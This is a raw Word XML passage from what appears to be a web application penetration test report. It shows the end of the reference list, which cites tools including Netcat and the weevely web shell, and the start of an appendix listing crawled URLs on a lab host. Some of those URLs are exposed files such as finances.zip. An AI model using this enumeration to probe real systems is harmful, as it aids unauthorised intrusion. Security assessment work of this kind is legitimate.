                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>PuTTY</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve"> - a free SSH and telnet client for Windows</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://www.putty.org/ (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="0A126944" w14:textId="77777777" w:rsidR="00C8024C" w:rsidRDefault="00C8024C" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>curl</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://curl.haxx.se/ (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="3CB47B38" w14:textId="77777777" w:rsidR="00E2240F" w:rsidRDefault="00C8024C" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve">The GNU </w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Netcat</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve"> -- Official homepage</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: http://netcat.sourceforge.net/ (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="76C8919E" w14:textId="77777777" w:rsidR="00113974" w:rsidRDefault="00E2240F" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Nessus Professional</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: https://www.tenable.com/products/nessus/nessus-professional (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5AA07A4F" w14:textId="77777777" w:rsidR="00B1280A" w:rsidRDefault="00113974" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t xml:space="preserve">mozdev.org - </w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>tamperdata</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>: help</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t> (2018). Available at: http://tamperdata.mozdev.org/help.html (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="1A827965" w14:textId="4A629E94" w:rsidR="00510F46" w:rsidRPr="001A29F9" w:rsidRDefault="00B1280A" w:rsidP="001A29F9">
              <w:pPr>
                <w:rPr>
                  <w:b/>
                  <w:bCs/>
                  <w:noProof/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:lastRenderedPageBreak/>
                <w:t>(2018) </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Tools.kali.org</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. Available at: https://tools.kali.org/maintaining-access/weevely (Accessed: 29 November 2018).</w:t>
              </w:r>
            </w:p>
          </w:sdtContent>
        </w:sdt>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="07B0EA75" w14:textId="77777777" w:rsidR="00510F46" w:rsidRDefault="00510F46"/>
    <w:p w14:paraId="5CB4505F" w14:textId="0EEED445" w:rsidR="00341658" w:rsidRDefault="00341658">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:smallCaps/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="36"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7C2B39" w14:textId="77777777" w:rsidR="00801886" w:rsidRPr="009A241B" w:rsidRDefault="00341658" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="431"/>
      </w:pPr>
      <w:bookmarkStart w:id="56" w:name="_Toc531104376"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Appendices</w:t>
      </w:r>
      <w:bookmarkEnd w:id="56"/>
    </w:p>
    <w:p w14:paraId="1292F3F7" w14:textId="77777777" w:rsidR="009A241B" w:rsidRDefault="00341658" w:rsidP="00341658">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="57" w:name="_Toc531104377"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="009525A9">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidR="00131110">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Application URLs</w:t>
      </w:r>
      <w:bookmarkEnd w:id="57"/>
    </w:p>
    <w:p w14:paraId="2AA5FE6F"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1EA88A"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http://192.168.1.10/Sign%20In.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C348328"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http://192.168.1.10/about.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65988B3E"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http://192.168.1.10/addendum.php?type=terms.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2822B113"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http://192.168.1.10/alterpassword.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F000CA"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http://192.168.1.10/cart_update.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735B2BE2"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http://192.168.1.10/cart_update.php?emptycart=1&amp;return_url=aHR0cDovLzE5Mi4xNjguMS4xMC9wcm9kdWN0cy5waHA/Y29tbWFuZCZwcm9kdWN0aWQ=</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAF6987"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http://192.168.1.10/cart_update.php?removep=8&amp;return_url=aHR0cDovLzE5Mi4xNjguMS4xMC9wcm9maWxlLnBocA==</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63700D39"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http://192.168.1.10/changepicture.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB831DA"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http://192.168.1.10/company-accounts/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215D527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http://192.168.1.10/company-accounts/?C=M;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1432342B"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http://192.168.1.10/company-accounts/finances.zip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65081648"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http://192.168.1.10/company-accounts/readme.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024BBEFF"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http://192.168.1.10/contact.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEAF343"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068314C8"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http://192.168.1.10/css/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC0F30D"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http://192.168.1.10/css/AnimateLogo.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E3934FB"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http://192.168.1.10/css/PaymentStyle.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B25362"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http://192.168.1.10/css/animate-custom.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B35940B"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http://192.168.1.10/css/audioplayer.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="117D41BE"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http://192.168.1.10/css/bootstrap.min.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D4FBE0A"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http://192.168.1.10/css/bootstrap.min.css?version=3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473A38F5"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http://192.168.1.10/css/cart.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA7F91B"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http://192.168.1.10/css/cart.css?version=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0C3C15"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http://192.168.1.10/css/chatStyle.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126998BF"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http://192.168.1.10/css/demo.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781583D1"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6EDE1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http://192.168.1.10/css/fonts/?C=S;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744BDBAB"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http://192.168.1.10/css/fonts/BebasNeue-webfont.eot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3726EF"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http://192.168.1.10/css/fonts/BebasNeue-webfont.svg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DD6362"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http://192.168.1.10/css/fonts/BebasNeue-webfont.ttf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="333A8829"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http://192.168.1.10/css/fonts/BebasNeue-webfont.woff</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6786536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http://192.168.1.10/css/fonts/Dharma%20Type%20Font%20License.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273A6D5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http://192.168.1.10/css/fonts/MyriadPro-Regular.eot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07814AB2"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http://192.168.1.10/css/fonts/MyriadPro-Regular.svg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061B48F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http://192.168.1.10/css/fonts/MyriadPro-Regular.ttf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCAC4FB"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lastRenderedPageBreak/>
        <w:t>http://192.168.1.10/css/fonts/MyriadPro-Regular.woff</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F3B332"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http://192.168.1.10/css/fonts/arialroundedmtstd-extrabold-webfont.eot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202E28C2"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http://192.168.1.10/css/fonts/arialroundedmtstd-extrabold-webfont.svg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DE58A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http://192.168.1.10/css/fonts/arialroundedmtstd-extrabold-webfont.ttf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFC7452"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http://192.168.1.10/css/fonts/arialroundedmtstd-extrabold-webfont.woff</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390747F7"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http://192.168.1.10/css/fonts/fontomas-webfont.eot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6760AC8A"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http://192.168.1.10/css/fonts/fontomas-webfont.svg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C813D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http://192.168.1.10/css/fonts/fontomas-webfont.ttf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50AE9DB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http://192.168.1.10/css/fonts/fontomas-webfont.woff</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E53133"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http://192.168.1.10/css/fonts/franchise-bold-webfont.eot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549D5974"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http://192.168.1.10/css/fonts/franchise-bold-webfont.svg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="337D8E82"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http://192.168.1.10/css/fonts/franchise-bold-webfont.ttf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72D0E31F"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http://192.168.1.10/css/fonts/franchise-bold-webfont.woff</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A60A8E"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http://192.168.1.10/css/fonts/myriadpro-bold-webfont.eot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46EFD1D0"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http://192.168.1.10/css/fonts/myriadpro-bold-webfont.svg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7950E570"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http://192.168.1.10/css/fonts/myriadpro-bold-webfont.ttf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7EE177"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http://192.168.1.10/css/fonts/myriadpro-bold-webfont.woff</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="319C5BBD"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http://192.168.1.10/css/proStyle.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56781C67"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http://192.168.1.10/css/style.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E684D7"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http://192.168.1.10/css/style.css?version=18</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E831BC0"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http://192.168.1.10/css/userlogin.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CC60F4"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http://192.168.1.10/custUpdate.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B04011"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http://192.168.1.10/customer.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49969455"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http://192.168.1.10/employeeValidate.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C557A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http://192.168.1.10/feedback_process.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DC03BD2"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http://192.168.1.10/icons</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C3A9D3"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http://192.168.1.10/icons/back.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5756E8E1"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http://192.168.1.10/icons/blank.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C30E8DD"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http://192.168.1.10/icons/compressed.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B623A0E"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http://192.168.1.10/icons/folder.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425A07C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http://192.168.1.10/icons/image2.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E904D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http://192.168.1.10/icons/text.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106C1BCE"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http://192.168.1.10/icons/unknown.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E7363F0"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCDA735"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http://192.168.1.10/images/1.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B947ED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http://192.168.1.10/images/2.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD39942"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http://192.168.1.10/images/3.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AB62ED"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http://192.168.1.10/images/33.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FEF1F2"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http://192.168.1.10/images/4.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06948E3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http://192.168.1.10/images/44.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C205110"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http://192.168.1.10/images/5.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED28311"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http://192.168.1.10/images/55.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CFAFC1D"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http://192.168.1.10/images/6.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A6D5AD"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http://192.168.1.10/images/66.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72603279"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lastRenderedPageBreak/>
        <w:t>http://192.168.1.10/images/7.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7D49F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http://192.168.1.10/images/77.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348C3678"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http://192.168.1.10/images/?C=S;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02125F0E"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http://192.168.1.10/images/Thumbs.db</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D55E2D"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http://192.168.1.10/images/a.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358A9FC5"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http://192.168.1.10/images/a.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2220149F"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http://192.168.1.10/images/ab.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43C3D940"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http://192.168.1.10/images/android-phone.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B723CA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http://192.168.1.10/images/arabsiyo.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788D8252"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http://192.168.1.10/images/arrow.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CD71B5"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http://192.168.1.10/images/b.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F901893"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http://192.168.1.10/images/b.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660BA7DA"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http://192.168.1.10/images/bb.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683337F9"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http://192.168.1.10/images/bottom-logo.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF74D3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http://192.168.1.10/images/brand-img1.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D5AC15A"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http://192.168.1.10/images/brand-img2.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB86945"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http://192.168.1.10/images/brand-img3.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AB5228"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http://192.168.1.10/images/brand-img4.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557BBD6B"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http://192.168.1.10/images/button-bg.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071E9980"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http://192.168.1.10/images/button-left.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BF37EFE"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http://192.168.1.10/images/button-right.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075BB8A8"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http://192.168.1.10/images/c.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C7CB7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http://192.168.1.10/images/cart-img1.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD5642D"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http://192.168.1.10/images/cart-img2.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18710B49"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http://192.168.1.10/images/cart-img3.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CAA970"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http://192.168.1.10/images/cart.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D31730"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http://192.168.1.10/images/cart.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2D5CAF"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http://192.168.1.10/images/cc.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60499404"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http://192.168.1.10/images/checked.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C0539F"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http://192.168.1.10/images/d.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A549908"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http://192.168.1.10/images/download%20(1).jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7FB06F"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http://192.168.1.10/images/download.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA06BB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http://192.168.1.10/images/e.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="485119B5"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http://192.168.1.10/images/employee.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A540081"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http://192.168.1.10/images/error.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A44734"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http://192.168.1.10/images/external-hard-disk.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404C76C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http://192.168.1.10/images/f.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50755E73"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http://192.168.1.10/images/favicon.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B5376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http://192.168.1.10/images/footer-shadow.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601BF550"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http://192.168.1.10/images/g.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9ED80E"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http://192.168.1.10/images/h.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D34A5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http://192.168.1.10/images/home.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD77007"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http://192.168.1.10/images/i.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F18B85"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http://192.168.1.10/images/item.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B82320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lastRenderedPageBreak/>
        <w:t>http://192.168.1.10/images/j.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC5FFA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http://192.168.1.10/images/jananka.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32EE4E1D"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http://192.168.1.10/images/k.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B378633"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http://192.168.1.10/images/l.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C24404D"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http://192.168.1.10/images/lcd-tv.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35C3817F"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http://192.168.1.10/images/logo.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="284BAF78"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http://192.168.1.10/images/main-bg.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A974942"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http://192.168.1.10/images/nav-bottom.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E271C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http://192.168.1.10/images/order.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42346CA9"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http://192.168.1.10/images/phonepicutres-TA.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70396928"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http://192.168.1.10/images/post-img.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65841499"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http://192.168.1.10/images/price-left.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17170F2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http://192.168.1.10/images/price-right.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AADB970"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http://192.168.1.10/images/print.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25AFEF35"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http://192.168.1.10/images/product-img1.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69787ED8"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http://192.168.1.10/images/product-img2.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EA72652"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http://192.168.1.10/images/product-img3.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D75E94F"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http://192.168.1.10/images/products-slide-left.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F846D84"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http://192.168.1.10/images/products-slide-right.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066A3780"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http://192.168.1.10/images/profile1.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33DFD51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http://192.168.1.10/images/profile2.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CFF6213"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http://192.168.1.10/images/restart-vm-tools.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6230A4"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http://192.168.1.10/images/s1.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF0F731"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http://192.168.1.10/images/s1.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6047F70E"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http://192.168.1.10/images/s10.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DDAF4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http://192.168.1.10/images/s2.jpg</w:t>
      </w:r>
    </w:p>
